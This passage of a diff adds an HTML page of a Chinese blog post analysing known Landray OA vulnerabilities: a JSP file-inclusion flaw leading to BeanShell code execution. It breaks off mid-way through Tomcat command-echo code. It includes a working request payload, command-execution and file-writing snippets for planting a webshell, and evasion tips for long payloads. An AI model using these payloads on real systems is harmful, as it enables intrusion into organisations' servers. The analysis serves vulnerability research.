@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>某OA简单分析 - ?___?</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="在某次项目过程中，遇到了蓝凌OA。此处主要分析一些Nday及结合实际的一些扩展。" /><meta name="keywords" content='Java, OA' /><meta itemprop="name" content="某OA简单分析">
+<meta itemprop="description" content="在某次项目过程中，遇到了蓝凌OA。此处主要分析一些Nday及结合实际的一些扩展。"><meta itemprop="datePublished" content="2022-12-31T23:59:59+08:00" />
+<meta itemprop="dateModified" content="2022-12-31T23:59:59+08:00" />
+<meta itemprop="wordCount" content="2347"><meta itemprop="image" content="http://example.org/logo.png"/>
+<meta itemprop="keywords" content="Java,OA," /><meta property="og:title" content="某OA简单分析" />
+<meta property="og:description" content="在某次项目过程中，遇到了蓝凌OA。此处主要分析一些Nday及结合实际的一些扩展。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-31T23:59:59+08:00" />
+<meta property="article:modified_time" content="2022-12-31T23:59:59+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="某OA简单分析"/>
+<meta name="twitter:description" content="在某次项目过程中，遇到了蓝凌OA。此处主要分析一些Nday及结合实际的一些扩展。"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><link rel="prev" href="http://example.org/posts/frp/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "某OA简单分析",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/example.org\/posts\/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/"
+    },"genre": "posts","keywords": "Java, OA","wordcount":  2347 ,
+    "url": "http:\/\/example.org\/posts\/%E8%93%9D%E5%87%8Coa%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/","datePublished": "2022-12-31T23:59:59+08:00","dateModified": "2022-12-31T23:59:59+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "作者"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="?___?"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/fixit.min.svg"
+    data-srcset="/fixit.min.svg, /fixit.min.svg 1.5x, /fixit.min.svg 2x"
+    data-sizes="auto"
+    alt="?___?"
+    title="?___?"/><span class="header-title-text">le3tq&#39; blog</span></a><span id="typeit-header-subtitle-desktop" class="typeit header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-archive fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="?___?"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/fixit.min.svg"
+    data-srcset="/fixit.min.svg, /fixit.min.svg 1.5x, /fixit.min.svg 2x"
+    data-sizes="auto"
+    alt="/fixit.min.svg"
+    title="/fixit.min.svg"/><span class="header-title-text">le3tq&#39; blog</span></a><span id="typeit-header-subtitle-mobile" class="typeit header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-archive fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container-reverse" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span title="转载" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>某OA简单分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      </span></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 漏洞分析</a></span></div>
+      <div class="post-meta-line"><span title=2022-12-31&#32;23:59:59><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-12-31">2022-12-31</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2347 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 5 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="某OA简单分析">
+            <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
+    </div><div class="featured-image"><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png"
+    data-srcset="https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png, https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png 1.5x, https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png 2x"
+    data-sizes="auto"
+    alt="https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png"
+    title="https://s2.loli.net/2022/12/26/k5g8wTaVWdOU4i2.png"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞分析">漏洞分析</a>
+      <ul>
+        <li><a href="#customjsp任意文件读取">custom.jsp任意文件读取</a></li>
+        <li><a href="#dataxmljsp任意执行代码">dataxml.jsp任意执行代码</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞利用">漏洞利用</a>
+      <ul>
+        <li><a href="#一些难点">一些难点</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞扩展">漏洞扩展</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>在某次项目过程中，遇到了蓝凌OA。此处主要分析一些Nday及结合实际的一些扩展。</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<blockquote>
+<p>此处主要分析由 <code>custom.jsp</code> 引起的代码执行。</p>
+</blockquote>
+<h3 id="customjsp任意文件读取">custom.jsp任意文件读取</h3>
+<p>源码位于</p>
+<p><code>sys/ui/extend/varkind/custom.jsp</code></p>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">....
+&lt;%@ taglib prefix=&#34;c&#34; uri=&#34;http://java.sun.com/jsp/jstl/core&#34;%&gt;
+&lt;%
+	JSONObject vara = JSONObject.fromObject(request.getParameter(&#34;var&#34;));
+	JSONObject body = JSONObject.fromObject(vara.get(&#34;body&#34;));
+	if(body.containsKey(&#34;file&#34;)){
+%&gt;
+&lt;c:import url=&#39;&lt;%=body.getString(&#34;file&#34;) %&gt;&#39; charEncoding=&#34;UTF-8&#34;&gt;
+	&lt;c:param name=&#34;var&#34; value=&#34;${ param[&#39;var&#39;] }&#34;&gt;&lt;/c:param&gt;
+&lt;/c:import&gt;
+&lt;% }%&gt;
+</code></pre><p>body是var传递的json参数，然后 <code>containsKey</code> 检测file。然后用到了jstl标签，它属于jsp应用的一个核心模块。而 <code>&lt;c:import</code> 标签相当于 <code>jsp:include</code> 的扩展，简单可以理解为本地文件包含+SSRF。</p>
+<p>所以说它是任意文件读取不太恰当。正是因为这个文件包含，引发了下面一系列代码执行。</p>
+<h3 id="dataxmljsp任意执行代码">dataxml.jsp任意执行代码</h3>
+<p>源码位于</p>
+<p><code>sys/common/dataxml.jsp</code></p>
+<p>截取漏洞核心代码部分</p>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;%
+	//....
+  ApplicationContext ctx = WebApplicationContextUtils.getRequiredWebApplicationContext(session.getServletContext());
+	RequestContext requestInfo = new RequestContext(request);
+	String[] beanList = request.getParameter(&#34;s_bean&#34;).split(&#34;;&#34;);
+	IXMLDataBean treeBean;
+	HashMap nodeMap;
+	Object node, value;
+	Object[] nodeList;
+	Iterator attr;
+	String key;
+	int i, j, k;
+	StringBuilder sout = new StringBuilder();
+	JSONArray sarray = new JSONArray();
+	sout.append(&#34;&lt;dataList&gt;&#34;);
+	for(i=0; i&lt;beanList.length; i++){
+		treeBean = (IXMLDataBean) ctx.getBean(beanList[i]);
+		nodes = treeBean.getDataList(requestInfo);
+    //....
+    )
+ %&gt;
+</code></pre><p>上面代码主要逻辑为通过 <code>;</code> 符号分割 <code>s_bean</code>参数，循环调用 <code>getBean</code> 函数来获取创建了 <code>Spring Bean</code> 容器的对象。然后利用该对象的 <code>getDataList</code> 方法来处理最终的 <code>requestInfo</code> 。</p>
+<p>通过上面代码我们可以发现，<code>ctx</code> 的 <code>bean</code> 对象是从 <code>session</code> 的 <code>Servlet</code> 来获取的。那就说明实现了 <code>IXMLDataBean</code> 接口的类，都属于 <code>Spring Bean</code> 对象类。看一下实现该接口的类和 <code>getDataList</code> 方法有多少。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/LtpUr2KzaBmXJYk.png"
+    data-srcset="https://s2.loli.net/2023/01/01/LtpUr2KzaBmXJYk.png, https://s2.loli.net/2023/01/01/LtpUr2KzaBmXJYk.png 1.5x, https://s2.loli.net/2023/01/01/LtpUr2KzaBmXJYk.png 2x"
+    data-sizes="auto"
+    alt="image-20221231204544782"
+    title="image-20221231204544782"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/14IU2yGxE6BizKA.png"
+    data-srcset="https://s2.loli.net/2023/01/01/14IU2yGxE6BizKA.png, https://s2.loli.net/2023/01/01/14IU2yGxE6BizKA.png 1.5x, https://s2.loli.net/2023/01/01/14IU2yGxE6BizKA.png 2x"
+    data-sizes="auto"
+    alt="image-20221231204641878"
+    title="image-20221231204641878"/></p>
+<p>通过上图可以看到，实现了该接口的类有572个，实现了该接口类的方法有544个。</p>
+<p>对于漏洞利用，我们需要在其中寻找可以代码执行的地方。由于该漏洞为历史漏洞，这里通过 <code>payload</code> 来继续接下来的分析。</p>
+<pre tabindex="0"><code>var={&#34;body&#34;:{&#34;file&#34;:&#34;/sys/common/dataxml.jsp&#34;}}&amp;s_bean=sysFormulaValidate&amp;script=
+</code></pre><p>可以看到传递的类名为 <code>sysFormulaValidate</code>，跟进一下。</p>
+<p>位于 <code>kmss_core.jar</code> 包中。</p>
+<p>类的位置在 <code>com/landray/kmss/sys/formula/web/SysFormulaValidate.class</code></p>
+<p>截取漏洞核心代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SysFormulaValidate</span> <span class="kd">implements</span> <span class="n">IXMLDataBean</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Log</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogFactory</span><span class="o">.</span><span class="na">getLog</span><span class="o">(</span><span class="n">SysFormulaValidate</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">SysFormulaValidate</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">List</span> <span class="nf">getDataList</span><span class="o">(</span><span class="n">RequestContext</span> <span class="n">requestInfo</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">List</span> <span class="n">rtnVal</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">node</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">msg</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">confirm</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">forceMsg</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">script</span> <span class="o">=</span> <span class="n">requestInfo</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;script&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">type</span> <span class="o">=</span> <span class="n">requestInfo</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;returnType&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">funcs</span> <span class="o">=</span> <span class="n">requestInfo</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;funcs&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">model</span> <span class="o">=</span> <span class="n">requestInfo</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;model&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">FormulaParser</span> <span class="n">parser</span> <span class="o">=</span> <span class="n">FormulaParser</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">requestInfo</span><span class="o">,</span> <span class="k">new</span> <span class="n">ValidateVarGetter</span><span class="o">((</span><span class="n">ValidateVarGetter</span><span class="o">)</span><span class="kc">null</span><span class="o">),</span> <span class="n">model</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">StringUtil</span><span class="o">.</span><span class="na">isNotNull</span><span class="o">(</span><span class="n">funcs</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span><span class="o">[]</span> <span class="n">funcArr</span> <span class="o">=</span> <span class="n">funcs</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&#34;;&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">funcArr</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">parser</span><span class="o">.</span><span class="na">addPropertiesFunc</span><span class="o">(</span><span class="n">funcArr</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="na">parseValueScript</span><span class="o">(</span><span class="n">script</span><span class="o">,</span> <span class="n">type</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">//......
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>通过上面代码可以看到我们传递的参数 <code>script</code> 被 <code>parser.parseValueScript</code> 解析。跟进这个解析方法。同样在 <code>kmss_core.jar</code> 包，类位于</p>
+<p><code>com/landray/kmss/sys/formula/parser/FormulaParser.class</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">parseValueScript</span><span class="o">(</span><span class="n">String</span> <span class="n">script</span><span class="o">,</span> <span class="n">String</span> <span class="n">type</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">EvalException</span><span class="o">,</span> <span class="n">KmssUnExpectTypeException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">parseValueScript</span><span class="o">(</span><span class="n">script</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">StringUtil</span><span class="o">.</span><span class="na">isNotNull</span><span class="o">(</span><span class="n">type</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getSysMetadataParser</span><span class="o">().</span><span class="na">formatValue</span><span class="o">(</span><span class="n">value</span><span class="o">,</span> <span class="n">type</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>不传入type参数时，通过 <code>parseValueScript</code> 进行解析。跟进（同样在上面类中。由于代码过长，此处利用截图展示</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/iTeqJguop2rY5KG.png"
+    data-srcset="https://s2.loli.net/2023/01/01/iTeqJguop2rY5KG.png, https://s2.loli.net/2023/01/01/iTeqJguop2rY5KG.png 1.5x, https://s2.loli.net/2023/01/01/iTeqJguop2rY5KG.png 2x"
+    data-sizes="auto"
+    alt="image-20221231210512704"
+    title="image-20221231210512704"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/ty3NqGZg5Hhruzc.png"
+    data-srcset="https://s2.loli.net/2023/01/01/ty3NqGZg5Hhruzc.png, https://s2.loli.net/2023/01/01/ty3NqGZg5Hhruzc.png 1.5x, https://s2.loli.net/2023/01/01/ty3NqGZg5Hhruzc.png 2x"
+    data-sizes="auto"
+    alt="image-20221231210616450"
+    title="image-20221231210616450"/></p>
+<p>通过上图可以发现，实例化了 <code>bsh</code> 的 <code>Interpreter</code> 类，然后通过一系列特殊符号处理，最终调用<code>eval</code> 方法执行 处理完的 <code>script</code> 参数。bsh即<code>BeanShell</code>。所以其实这是一个 <code>BeanShell</code> 代码执行。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<blockquote>
+<p>漏洞利用往往不止于简单的输入输出。这里主要讨论web权限的完整获取。如静态webshell、内存马、执行命令等。</p>
+</blockquote>
+<p>前面说到漏洞原理最终为 <code>Beanshell</code> 代码执行，<code>Beanshell</code> 可以执行动态Java代码。参考一些其他OA或cms发现的同类型漏洞。如某微、某远，普遍利用为</p>
+<pre tabindex="0"><code>exec(&#34;whoami&#34;);
+</code></pre><p>demo如下</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/jWbILuP54vsKT1h.png"
+    data-srcset="https://s2.loli.net/2023/01/01/jWbILuP54vsKT1h.png, https://s2.loli.net/2023/01/01/jWbILuP54vsKT1h.png 1.5x, https://s2.loli.net/2023/01/01/jWbILuP54vsKT1h.png 2x"
+    data-sizes="auto"
+    alt="image-20221231212155919"
+    title="image-20221231212155919"/></p>
+<p>这是通过其模块自带的命令执行，如果是Java命令执行的换成Runtime即可。</p>
+<p>假如我们需要写 <code>webshell</code> 的话。则是通过文件io流来写入，这里采用文件缓冲流来举例，当然也可以用reader等方式。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span><span class="n">BufferedWriter</span> <span class="n">out</span><span class="o">=</span><span class="k">new</span> <span class="n">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="s">&#34;./test.txt&#34;</span><span class="o">));</span><span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;test123&#34;</span><span class="o">);</span><span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span></code></pre></div><p>demo</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/01/01/vUSPG53QtWC26kT.png"
+    data-srcset="https://s2.loli.net/2023/01/01/vUSPG53QtWC26kT.png, https://s2.loli.net/2023/01/01/vUSPG53QtWC26kT.png 1.5x, https://s2.loli.net/2023/01/01/vUSPG53QtWC26kT.png 2x"
+    data-sizes="auto"
+    alt="image-20221231223008821"
+    title="image-20221231223008821"/></p>
+<p>这里需要注意的是目录和写入文件过长、内容存在特殊符号的问题，根目录建议采用命令执行来获取。而内容过程考虑多次追加，特殊符号可以base编码写入。</p>
+<h3 id="一些难点">一些难点</h3>
+<p>回过来谈谈蓝凌OA漏洞利用的一些难点，这也是项目中遇到的一些问题。</p>
+<ul>
+<li>命令执行无回显</li>
+<li>payload过长&amp;特殊字符</li>
+</ul>
+<p><strong>命令执行回显</strong></p>
+<p>先说说第一个问题。命令执行无回显主要解决方式为tomcat通用回显，这也是对于当前OA的解决方式，对于其他OA应使用对应web中间件回显。这里主要针对tomcat 7、8、9的通用回显。</p>
+<p>代码源于一些公开文章，主要在于反射获取线程中的 <code>Processor</code> 对象。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">boolean</span> <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ThreadGroup</span> <span class="n">group</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">group</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;threads&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">group</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">threads</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Thread</span> <span class="n">t</span> <span class="o">=</span> <span class="n">threads</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">t</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">continue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
